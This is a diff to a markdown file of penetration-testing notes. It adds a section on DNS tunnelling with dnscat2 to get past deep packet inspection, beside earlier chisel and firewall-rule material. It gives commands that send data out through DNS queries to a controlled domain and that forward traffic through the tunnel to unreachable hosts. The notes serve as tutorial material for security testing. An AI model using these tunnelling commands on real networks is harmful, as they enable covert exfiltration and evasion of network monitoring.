@@ -106,6 +106,8 @@ To remove when we're done:
 netsh advfirewall firewall delete rule name="our_firewall_rule_name"
 ```
 
+## Linux DPI Tunnelling
+
 ### Chisel
 In the unlikely event that we need to circumvent deep packet inspection by encapsulating our tunnelling packets in HTTP requests, we can make use of the oddly named `chisel`. First we'll need to smuggle the binary onto the machine and make it executable:
 ```bash
@@ -129,3 +131,34 @@ The SOCKS proxy in use will perform a loopback on our `chisel` server to port `1
 ```bash
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<machine2 IP>
 ```
+
+### dnscat
+If instead of HTTP filtering we are instead given only DNS querying over port 53 we can make use of DNS tunnelling. By being crafty we can smuggle data in both directions between client and server.
+
+From client to server aribtrary strings can be queried, for instance: `nslookup ab3810cd5f77a.suckers.domain`. The hex garbage we queried for as a subdomain obviously doesn't exist, and by default the server will return a message saying that the request has failed, but it doesn't matter. The hex garbage will reach the server. Enough similar requests will be adequate to stream a not insignificant amount of data from client to server.
+
+Going the other way, a DNS server can store arbitrary text records which a client can query for. In this way arbitrary data can be smuggled to the client. Taken together these methods allow for arbitrary data transfer between server and client, and hence a tunnel.
+
+To create this connection with `dnscat` run the following on the machine hosting the DNS server with domain `our domain`:
+```bash
+dnscat2-server <our domain>
+```
+then connect and establish the tunnel from the other end by running:
+```bash
+./dnscat <our domain>
+```
+Nb. if the server we ran `dnscat2-server` on is not the authoritative server then we can also connect to using just an IP via:
+```bash
+./dnscat --dns <dns server IP>,port=53
+```
+From the machine that we ran `dnscat2-server` on we're now a few trivial commands away from a usable tunnel:
+```bash
+windows
+```
+```bash
+windows -i <no. of the command session associated with the client we want to connect to (probably 1)>
+```
+```bash
+listen 127.0.0.1:2345 <IP to forward traffic to>:<port to forward to>
+```
+The command above will establish a loopback listener on the server at `127.0.0.1:2345`, and forward that traffic via the DNS client to an address that was otherwise unreachable.
